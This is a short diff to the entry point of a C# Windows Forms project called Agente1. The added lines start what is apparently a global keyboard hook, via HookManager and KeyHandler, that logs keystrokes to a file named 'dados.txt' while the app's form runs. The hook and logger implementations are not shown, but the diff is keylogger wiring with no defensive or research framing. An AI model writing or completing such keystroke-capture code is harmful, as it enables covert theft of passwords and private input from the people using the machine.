@@ -1,3 +1,6 @@
+using System;
+using System.Windows.Forms;
+
 namespace Agente1
 {
     internal static class Program
@@ -11,7 +14,15 @@ namespace Agente1
             // To customize application configuration such as set high DPI settings or default font,
             // see https://aka.ms/applicationconfiguration.
             ApplicationConfiguration.Initialize();
+            var fileLogger = new FileLogger("dados.txt");
+            var keyHandler = new KeyHandler(fileLogger);
+            var hookManager = new HookManager(keyHandler, fileLogger);
+
+            fileLogger.LogSessionStart();
+            hookManager.Start();
+
             Application.Run(new Agente());
+            hookManager.Unhook();
         }
     }
 }
